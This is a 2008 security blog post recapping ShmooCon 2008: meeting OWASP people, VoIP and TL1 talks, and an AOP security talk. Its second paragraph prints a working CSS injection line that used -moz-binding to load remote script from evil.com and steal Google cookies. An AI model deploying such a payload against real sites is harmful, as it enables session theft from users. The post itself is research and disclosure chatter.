author: Marcin
disqus_id: 58089062-6be1-477b-80c5-a74bc9b91b24
disqus_url: http://www.tssci-security.com/archives/2008/02/19/back-from-dc-shmoocon-2008-recap/
mod_date: 2008-02-21 14:22:16
parent: 0
post_id: 378
post_type: post
pub_date: 2008-02-19 20:26:27
public: 'yes'
slug: back-from-dc-shmoocon-2008-recap
tags:
- Conferences
- People
- Security
template: post.html
title: Back from D.C. -- ShmooCon 2008 recap

Back from D.C. -- ShmooCon 2008 recap
#####################################

We're back from a great weekend in Washington, D.C. at ShmooCon 08'. Dre
and I arrived Thursday night just in time for the bar to close and with
having no hotel room reserved, we were in for a long night.
Interestingly enough though, at around 5am, we found that we were able
to modify the look of a Google page through a CSS stylesheet we
controled. Using the ``tr:first-child td`` CSS property, we could do all
sorts of things to Google's content, such as ``display:none`` and
changing the color.

We had plans to meet up with `Arshan of
omg.wtf.bbq <http://i8jesus.com/>`_ (and author of
`Anti-Samy <http://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project>`_)
later that morning, so he invited us back to the Aspect Security office
to hang out with the team. Jeff Williams, chairman of the OWASP board
gave us a tour and we even had the chance to see the OWASP wiki, quietly
humming away in its rack. So beautiful.. We showed off our finding to
Arshan and Jeff to get some ideas on where to take it. I went in
thinking we should try out ``-moz-binding:url()``, so Arshan quickly
wrote up some JavaScript that would steal Google cookies. We tried it
out and it worked -- the working exploit affected Google through the
following CSS property:

``tr:first-child td {-moz-binding:url("http://evil.com/xssmoz.xml#xss");}``

Later that evening, we met up with `Romain
Gaucher <http://rgaucher.info/>`_, Jon Rose, Brian Holyfield and a bunch
of other people to go out drinking. We ended up discussing our talk a
lot that night and some of the work we've all been doing. So much cool
stuff, I can barely wrap my head around it all.

On Saturday, we hung out with Joe from `Learn Security
Online <http://www.learnsecurityonline.com/>`_ who gave me some cool
tips on VoIP pen-testing, and which conveniently lead to seeing Jason
Ostrom and John Kindervag (the VoIP hacker clowns) talk about
penetration testing VoIP networks, something that'll come in real handy
over the next couple weeks for me.

I shortly met up with
`Hoff <http://rationalsecurity.typepad.com/blog/>`_ for a bit, going to
the talk on how databases are so hard to secure... After about five
minutes I followed Hoff out and went to TL1 Device Security, which was
pretty much over! The discussions though were great, and I got some good
information out of it, having gone in not even knowing wtf a TL1 is.
Basically a `TL1 is SNMP for
telecoms <http://en.wikipedia.org/wiki/TL1>`_ -- think SCADA without the
controls, and only worse. eek

The best talk of the day was hands down, Rohit and Nish's talk on Using
Aspect Oriented Programming to Prevent Application Attacks. What's nice
about AOP is the ability to secure legacy code without having to touch
the source. It would be nice to implement AOP along with building
security in throughout the entire Secure SDLC. We got to talking with
Rohit and Nish, along with their friend Hugo throughout the evening.

After our talk Sunday, `Chris Gates and
Dean <http://carnal0wnage.blogspot.com/>`_ came up to us to say hello.
Like they said on their
`blog <http://carnal0wnage.blogspot.com/2008/02/shmoocon-2008-my-002_17.html>`_,
it's nice finally putting faces to names. Anyways, that's pretty much it
for this weekend. I'm working on getting our presentation content up
soon (before the night's over), so stay tuned for that.
